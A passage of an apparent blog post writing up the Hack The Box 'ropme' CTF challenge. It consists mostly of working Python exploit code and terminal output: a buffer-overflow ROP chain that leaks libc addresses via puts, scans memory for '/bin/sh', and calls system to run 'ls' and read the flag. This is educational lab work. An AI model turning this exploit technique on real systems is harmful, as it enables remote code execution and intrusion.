+</span></span><span style="display:flex;"><span>fflush_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400510</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x601018</span>)
+</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_got             <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_plt             <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> NULL                 <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> fflush_plt           <span style="color:#75715e"># return here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> main_addr            <span style="color:#75715e"># After the fflush, go to main again</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e"># Ask the attacker for input again!</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>remote(payload)
+</span></span></code></pre></div><p>This is what we get:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+Virtual address of puts is: 0x7f96309ad690
+Base of libc: 0x7f963093e000
+Address of system:  0x7f9630983390
+Address of binsh:  0x7f9630acad57
+sh: 1: %s%s%s%s%s%s%s%s: not found
+</code></pre><p>What? &ldquo;%s%s%s%s%s%s%s%s&rdquo; not found? who asked you to run that? the only explanation that I can think of is that it may be that the offset of <code>&quot;/bin/sh&quot;</code> was wrong. And that we have sent the wrong string.</p>
+<p>To make sure, let&rsquo;s back up a little bit and try to put that string in the <code>puts</code> function and see what string is in that offsets, similar to what we did to leak the address - but this time we print a string.</p>
+<p>The code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    remote_address <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;docker.hackthebox.eu&#34;</span>,<span style="color:#ae81ff">35034</span>))
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connecting to &#34;</span>, remote_address
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect(remote_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># server&#39;s initial message: &#34;ROP ME outside...&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connected. sending data&#34;</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(bytes(data <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Only take the 7 first bytes of the input</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Because the rest of it will be &#34;ROP Me outside ...&#34; again</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we don&#39;t care about that, we care about the address only</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#ae81ff">7</span>]      
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># omit the 0a</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># reverse the order</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Virtual address of puts is: 0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> compute_libc_base_from_puts(int(binascii<span style="color:#f92672">.</span>hexlify(ans), <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Base of libc:&#34;</span>, hex(libc_base)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of system: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of binsh: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Craft new payload</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">=</span> PAD                      <span style="color:#75715e"># 72 bytes of &#34;A&#34;s</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret      <span style="color:#75715e"># return there when done with main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># address of &#34;/bin/sh&#34;, this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Instead of calling system now, let&#39;s call puts</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> puts_plt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># fflush</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> NULL
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> fflush_plt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## WILL RETURN SOON</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Address of system. return here after you pop</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload2 += ptr(libc_base + 0x45390)    </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get back an answer, we expect that system(&#34;/bin/sh&#34;) will run</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span></code></pre></div><p>And the output:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+Virtual address of puts is: 0x7f09f667e690
+Base of libc: 0x7f09f660f000
+Address of system:  0x7f09f6654390
+Address of binsh:  0x7f09f679bd57
+%s%s%s%s%s%s%s%s
+</code></pre><p>So it seems this is actually the string that is in the offset. I couldn&rsquo;t really tell why libc is wrong, but it doesn&rsquo;t matter. Let&rsquo;s look around that string and look for the string we want.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18cd57</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">=</span> PAD                      <span style="color:#75715e"># 72 bytes of &#34;A&#34;s</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret      <span style="color:#75715e"># return there when done with main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># address of &#34;/bin/sh&#34;, this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> offset)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Instead of calling system now, let&#39;s call puts</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> puts_plt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># fflush</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> NULL
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> fflush_plt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> main_addr   <span style="color:#75715e"># back to main so we can send payload again</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## WILL RETURN SOON</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Address of system. return here after you pop</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload2 += ptr(libc_base + 0x45390)    </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get back an answer, we expect that system(&#34;/bin/sh&#34;) will run</span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;string @ &#34;</span> <span style="color:#f92672">+</span> hex(offset), <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># After reach loop, change the offset</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x10</span>  
+</span></span></code></pre></div><p>Basically, we look downwards for strings. If I won&rsquo;t find &ldquo;bin/sh&rdquo; after a while, I will look upwards.</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+Virtual address of puts is: 0x7fd8c7f01690
+Base of libc: 0x7fd8c7e92000
+Address of system:  0x7fd8c7ed7390
+Address of binsh:  0x7fd8c801ed57
+string @ 0x18cd57 	%s%s%s%s%s%s%s%s
+
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cd47 	TO FIX:
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cd37 	GVERB
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cd27 	anonicalize.c
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cd17 	/bin/sh
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cd07 	b/strtod_l.c
+ROP me outside, how &#39;about dah?
+
+string @ 0x18ccf7 	cy != 0
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cce7 	size == densize
+ROP me outside, how &#39;about dah?
+
+string @ 0x18ccd7 	d
+ROP me outside, how &#39;about dah?
+
+string @ 0x18ccc7 	ize == 1 &amp;&amp; n &lt; d
+ROP me outside, how &#39;about dah?
+
+string @ 0x18ccb7 	_digits &gt; 0
+ROP me outside, how &#39;about dah?
+
+string @ 0x18cca7 	t == 0
+ROP me outside, how &#39;about dah?
+
+^Cstring @ 0x18cc97 	Traceback (most recent call last):
+  File &#34;exploit.py&#34;, line 101, in &lt;module&gt;
+    remote(payload)
+  File &#34;exploit.py&#34;, line 72, in remote
+    print &#34;string @ &#34; + hex(offset), &#34;\t&#34;, conn.recv(1024)
+KeyboardInterrupt
+</code></pre><p>Lucky us! the offset was actually <code>0x18cd17</code> and not what the libc database said.
+Let&rsquo;s re-run the script with the new offset</p>
+<p>Our final script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute_libc_base_from_puts</span>(puts_va):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># remote machine uses libc v2.23</span>
+</span></span><span style="display:flex;"><span>    puts_offset_in_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6f690</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> puts_va <span style="color:#f92672">-</span> puts_offset_in_libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    remote_address <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;docker.hackthebox.eu&#34;</span>,<span style="color:#ae81ff">35076</span>))
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connecting to &#34;</span>, remote_address
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect(remote_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># server&#39;s initial message: &#34;ROP ME outside...&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connected. sending data&#34;</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(bytes(data <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print ans
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Only take the 7 first bytes of the input</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Because the rest of it will be &#34;ROP Me outside ...&#34; again</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we don&#39;t care about that, we care about the address only</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#ae81ff">7</span>]      
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># omit the 0a</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># reverse the order</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Virtual address of puts is: 0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> compute_libc_base_from_puts(int(binascii<span style="color:#f92672">.</span>hexlify(ans), <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Base of libc:&#34;</span>, hex(libc_base)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of system: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of binsh: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd17</span>)  <span style="color:#75715e"># fixed this</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Craft new payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">=</span> PAD                      <span style="color:#75715e"># 72 bytes of &#34;A&#34;s</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret      <span style="color:#75715e"># return there when done with main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Address of &#34;/bin/sh&#34;, this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd17</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Address of system. return here after you pop</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload2 += puts_plt   </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send a command to system</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># What do we get back?</span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;got back:&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400626</span>)
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4004e0</span>)
+</span></span><span style="display:flex;"><span>fflush_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400510</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x601018</span>)
+</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_got             <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_plt             <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> NULL                 <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> fflush_plt           <span style="color:#75715e"># return here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> main_addr            <span style="color:#75715e"># After the fflush, go to main again</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e"># Ask the attacker for input again!</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>remote(payload)
+</span></span></code></pre></div><p>We get back:</p>
+<pre tabindex="0"><code>connecting to  (&#39;docker.hackthebox.eu&#39;, 35076)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+�����
+ROP me outside, how &#39;about dah?
+
+Virtual address of puts is: 0x7fceeffdb690
+Base of libc: 0x7fceeff6c000
+Address of system:  0x7fceeffb1390
+Address of binsh:  0x7fcef00f8d17
+got back:
+flag.txt
+ropme
+spawn.sh
+</code></pre><p>So we learn that there are 3 files in the directory, we can just send &ldquo;cat flag.txt&rdquo; instead of &ldquo;ls&rdquo; and get the flag</p>
+<pre tabindex="0"><code>ROP me outside, how &#39;about dah?
+
+connected. sending data
+��@R
+ROP me outside, how &#39;about dah?
+
+Virtual address of puts is: 0x7f135240f690
+Base of libc: 0x7f13523a0000
+Address of system:  0x7f13523e5390
+Address of binsh:  0x7f135252cd17
+got back:
+HTB{r0p_m3_if_y0u_c4n!}
+</code></pre><h3 id="note-to-self">Note to self</h3>
+<p>This challenge was more difficult that I&rsquo;ve expected. At first glance I noticed the buffer overflow and thought immediately that I solved it, silly me. I feel like this challenge was more practical than it was &ldquo;difficult&rdquo; in a sense that it was not that hard to solve, but it was rather hard to implement everything and put it all together.</p>
+<ul>
+<li>Stack alignment is a thing when calling functions, <strong>remember that next time you decide to mess around with calls</strong></li>
+<li>Leaking addresses can be done not just with format string exploit, but with ROPing to <code>puts</code> as well!</li>
+<li><a href="https://libc.blukat.me">Libc database</a> Can be a very handy tool to figure out the remote machine&rsquo;s libc version</li>
+<li>Looping back to main again can help you when you leak an address from the machine and want to use it in a new payload</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
